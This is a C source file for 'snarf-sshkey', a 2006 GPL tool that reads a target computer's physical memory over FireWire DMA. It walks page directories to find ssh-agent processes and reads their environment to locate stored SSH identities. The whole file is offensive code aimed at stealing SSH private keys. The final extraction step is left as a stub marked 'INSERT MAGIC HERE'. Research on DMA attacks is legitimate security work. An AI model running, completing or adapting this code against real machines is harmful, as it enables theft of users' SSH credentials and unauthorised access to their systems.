/*  $Id$
 *  snarf-sshkey : snarf ssh private keys from ssh-agent via
 *                 physical memory access (e.g. firewire)
 *
 *  Copyright (C) 2006
 *  losTrace aka "David R. Piegdon"
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License version 2, as
 *  published by the Free Software Foundation.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

#define _LARGEFILE64_SOURCE

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#include <physical.h>
#include <linear.h>

char pagedir[4096];
addr_t stack_bottom = 0;

#define NODE_OFFSET     0xffc0

// dump a page in neat format
void dump_page(uint32_t pn, char* page)
{
	uint32_t addr;
	int i,j;
	char c;
	printf("dump page %x\n", pn);

	addr = pn * 4096;
	for(i = 0; i<4096; i+=16) {
		printf("page 0x%05x, addr 0x%08x: ", pn, addr+i);
		for(j = 0; j < 16; j++) {
			printf("%02hhx ", (page+i)[j]);
			if((j+1)%4 == 0 && j)
				putchar(' ');
		}
		printf("  |  ");
		for(j = 0; j < 16; j++) {
			c = (page+i)[j];
			if(c < 0x20)
				c = '.';
			if(c >= 0x7f)
				c = '.';
			putchar(c);
		}
		printf("\n");
	}
}

// the following two functions, get_process_name and resolve_env are
// using the stack bottom of the given process. i have found that
// after a process starts and parses its ENV and ARGVs, all those are
// in the uppermost page of the userspace (adr < 0xc0000000). in this
// page, the uppermost (-1) argument is the process name (with about
// five (5) \0 at the end of the string, then environment variables
// follow, each separated by a \0. then the ARGVs and then \0\0.

// return the process name in a malloc'ed buffer or NULL, if none.
char* get_process_name(linear_handle h)
{
	addr_t pn;
	addr_t padr;
	char* page;
	page = malloc(4096);
	int valid_page = 0;

	char* ret = NULL;

	stack_bottom = 0;
	pn = 0xbffff;

	while(!valid_page && pn >= 0xbf000) {
		if(linear_to_physical(h, pn*4096, &padr)) {
			// page is not mapped
		} else {
			// found stack bottom
			valid_page = 1;
			stack_bottom = pn;

			printf("  |  lin. page 0x%05x -> phys. page 0x%05x", (uint32_t)pn, (uint32_t)padr >> 12);
			if(linear_read_page(h, pn, page))
				printf("UNREADABLE PAGE");
			else {
				char* p = page + 4096 - 1;

				// in stack: seek process name
				while( (*p == 0) && (p >= page) )
					p--;
				while( (*p != 0) && (p >= page) )
					p--;
				p++;
				printf("  |  process: %s", p);
				ret = malloc(strlen(p) + 1);
				strcpy(ret, p);
			}
		}
		pn--;
	}

	free(page);

	return ret;
}

// will try to resolve an environment variable of the given process
// by looking at the bottom of the stack
// returns NULL or env-vars contents in an malloced buffer
//
// uses stack_bottom from get_process_name()
char* resolve_env(linear_handle h, char* envvar)
{
	int i;
	char* stack;			// buffer with all relevant pages (MAX_ARG_PAGES)
	char* p;			// pointer to count downward in stack
	char* q;			// points to value of env-var
	char* ret = NULL;		// to return an pointer to the alloced string
	int env_ok;			// still environment vars?
	int found_eq;			// still an '=' in this var?

	// fail if we did not find a stack bottom
	if(!stack_bottom)
		return NULL;

	// on linux, the max environment and argument is limited by PAGESIZE * MAX_ARG_PAGES
	// MAX_ARG_PAGES is 32 (statically defined in include/linux/binfmts.h)
	// so we will read 32 pages of the stack (if there are that many)
#define MAX_ARG_PAGES 32
	stack = calloc(MAX_ARG_PAGES, 4096);
	// watch off by one
	for( i=1; i<=MAX_ARG_PAGES; i++) {
		linear_read_page(h, stack_bottom-MAX_ARG_PAGES+i, stack + (4096*(i-1) ));
		// don't care for errors.
	}

	// start at bottom of stack
	p = stack + (4096*MAX_ARG_PAGES) - 1;
	// skip \0 at the end
	while( (*p == 0) && (p >= stack) )
		p--;
	// skip process name
	while( (*p != 0) && (p >= stack) )
		p--;
	// abort if there is no stuff
	if(p == stack)
		return NULL;
	// now process each \0-separated entry and check
	// for an equal-sign '='
	env_ok = 1;
	while(env_ok) {
		// we have not found a '=' here, yet.
		found_eq = 0;
		// go to beginning of string
		p--; // (we are currently pointing at the \0 after the string)
		while( (*p != 0) && (p >= stack) ) {
			if(*p == '=') {
				found_eq = 1;
				*p = 0;
				q = p+1;
			}
			p--;
		}
		if(p == stack) {env_ok = 0; break;}
		if(!found_eq) {env_ok = 0; break;}
		
		// p   q
		// |   |
		// FOO=BAR
		//    |
		//    \0
		if(!strcmp(envvar, p+1)) {
			// we found the var
			ret = malloc(strlen(q) + 1);
			strcpy(ret, q);
			break;
		}
	}

	return ret;
}


// dump the full userspace hexadecimal to stdout
void dump_userspace(linear_handle h)
{
	addr_t pn;
	addr_t padr;
	char* page;
	page = malloc(4096);

	pn = 0;

	while(pn < 0xc0000) {
		if(linear_to_physical(h, pn*4096, &padr))
			printf("UNMAPPED PAGE 0x%05x\n", (uint32_t)pn);
		else {
			printf("page 0x%05x maps to 0x%08x\n", (uint32_t)pn, (uint32_t)padr);
			if(linear_read_page(h, pn, page))
				printf("UNREADABLE PAGE\n");
			else
				dump_page((uint32_t)pn, page);
		}
		pn++;
	}

	free(page);
}

void check_ssh_agent(linear_handle lin) {
	char* pname;

	pname = get_process_name(lin);
	printf("\n");
	if(pname) {
		if(!strcmp(pname, "ssh-agent") || !strcmp(pname, "/usr/bin/ssh-agent")) {
			printf("\x1b[1;31m" "hit" "\x1b[0m" "\n");
			char* home;
			home = resolve_env(lin, "HOME");
			if(home) {
				char identity_path[1024];
				addr_t pn;

				snprintf(identity_path, 1024, "%s/.ssh/", home);
				free(home);
				printf("\tidentity path would be \"%s\"\n", identity_path);
				// now lets seek for this string. it will be located somewhere
				// on the heap, right behind the executable.
				// the executable is mapped somewhere after 0x08000000, so
				// we will just start there. 0x08800000 should never be hit.
				pn = 0x08000;
				// btw. we are searching this string because it will be the
				// comment-field of the identity-struct of the ssh-agent
				// for more info, please see ssh-agent.c of openssh

				// XXX INSERT MAGIC HERE
				printf("\t" "\x1b[1;32m" "INSERT MAGIC HERE" "\x1b[0m" "\n");
			}
			printf("\x1b[1;31m" "end" "\x1b[0m" "\n");
		}
		free(pname);
	}
}

int main(int argc, char**argv)
{
	physical_handle phy;
	union physical_type_data phy_data;
	linear_handle lin;
	addr_t pn;
	char page[4096];
	float prob;

	// create and associate a physical source to /dev/mem
	phy = physical_new_handle();
	if(!phy) {
		printf("physical handle is null\n");
		return -2;
	}
	if(argc != 2) {
		printf("please give targets nodeid\n");
		return -1;
	}
	phy_data.ieee1394.raw1394handle = raw1394_new_handle();
	if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0)) {
		printf("raw1394 failed to set port\n");
		return -4;
	}
	phy_data.ieee1394.raw1394target = atoi(argv[1]) + NODE_OFFSET;
	printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
	printf("associating physical source with raw1394\n"); fflush(stdout);
	if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
		printf("physical_handle_associate() failed\n");
		return -3;
	}
	// associate linear
	printf("new lin handle..\n"); fflush(stdout);
	lin = linear_new_handle();
	printf("assoc lin handle..\n"); fflush(stdout);
	if(linear_handle_associate(lin, phy, arch_ia32)) {
		printf("failed to associate lin ia32!\n");
		return -5;
	}

	// search all pages for pagedirs
	// then, for each found, print process name
	// we only need to check first phys. GB
	for( pn = 0; pn < 0x40000; pn++ ) {
		if(linear_is_pagedir_fast(lin, pn)) {
			// load page
			physical_read_page(phy, pn, page);
			prob = linear_is_pagedir_probability(lin, page);
			if(prob > 0.01) {
				printf("page 0x%05x prob: %0.3f", (uint32_t)pn, prob);
				if(linear_set_new_pagedirectory(lin, page)) {
					printf("\nloading pagedir failed\n");
					continue;
				}
				check_ssh_agent(lin);
			}
		}
	}

	// release handles
	printf("rel lin handle..\n"); fflush(stdout);
	linear_handle_release(lin);
	printf("rel phy handle..\n"); fflush(stdout);
	physical_handle_release(phy);
	
	// exit 
	raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
	return 0;
}

